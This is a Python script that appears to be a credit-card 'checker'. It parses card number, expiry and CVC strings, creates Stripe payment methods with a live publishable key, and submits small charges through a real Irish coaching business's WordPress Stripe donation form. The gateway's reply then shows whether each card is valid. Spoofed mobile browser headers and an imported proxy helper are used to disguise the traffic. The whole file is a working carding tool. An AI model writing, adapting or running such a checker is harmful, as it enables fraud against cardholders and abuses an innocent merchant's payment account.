import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]		
	r = requests.session()

	cookies = {
	    'm': '1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b',
	}
	
	headers = {
	    'authority': 'm.stripe.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'text/plain;charset=UTF-8',
	    # 'cookie': 'm=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b',
	    'origin': 'https://m.stripe.network',
	    'referer': 'https://m.stripe.network/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'JTdCJTIybXVpZCUyMiUzQSUyMjc4ZDhhYjlmLWVkOWEtNDI5NC1iOWYyLTIyNDU0OWQ0MjQ2YzhlZDQ2OCUyMiUyQyUyMnNpZCUyMiUzQSUyMjlkMjg3NzUwLTEwZDMtNDNkOC1iZjA1LWFiNWNiZWEyOTM5MWU3MWMyMCUyMiUyQyUyMnVybCUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC5Tby1tVHdmdG9aY296azM1QnBvSlNsLTgwM1BfdHRkQVR3dTFOZjlsbzhRLmtzNnR2ODl3R1VxVmlOaE00VGhpN21xeWZYWVNzUklXY3FfUjBfelBYRmslMkZNYVBCb182RDRPS3hQS3IyMzZjY3ZSdER0Mk9BMzBXNDF2bW10QVU4WTNJJTJGJTIyJTJDJTIyc291cmNlJTIyJTNBJTIybW91c2UtdGltaW5ncy0xMC12MiUyMiUyQyUyMmRhdGElMjIlM0ElNUIlNUQlN0Q': '',
	}
	
	response = requests.post('https://m.stripe.com/6', cookies=cookies, headers=headers, data=data)
	
	muid = re.search(r'"muid":"(.*?)"', response.text).group(1)
	sid = re.search(r'"sid":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2F4ca544af8b%3B+stripe-js-v3%2F4ca544af8b%3B+card-element&referrer=https%3A%2F%2Fwww.safeplacecoaching.ie&time_on_page=328025&client_attribution_metadata[client_session_id]=15e03252-d368-44b1-a3fd-103782d64c5b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51LQsp2BuSrjL0RsQAK9aFAvxCtcb0BcUkdMe6AhTekcRFFmXialJv7f2ulywIlj5YngZqh9oPtP9R2yy89b6x6Zf00I3VLYBtT'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '__stripe_mid': f'{muid}',
	    '__stripe_sid': f'{sid}',
	}
	
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': '__stripe_mid=78d8ab9f-ed9a-4294-b9f2-224549d4246c8ed468; __stripe_sid=9d287750-10d3-43d8-bf05-ab5cbea29391e71c20',
	    'Origin': 'https://www.safeplacecoaching.ie',
	    'Referer': 'https://www.safeplacecoaching.ie/online-payments/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_payment_charge',
	    'wpfs-form-name': 'Online_Payment',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-card-holder-email': 'rodamuser08@gmail.com',
	    'wpfs-card-holder-name': 'Rodam User',
	    'wpfs-stripe-payment-method-id': f'{pm}',
	}
	
	response = requests.post('https://www.safeplacecoaching.ie/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	result = re.search(r'"message":"(.*?)"', response.text).group(1)
		
	return (result)
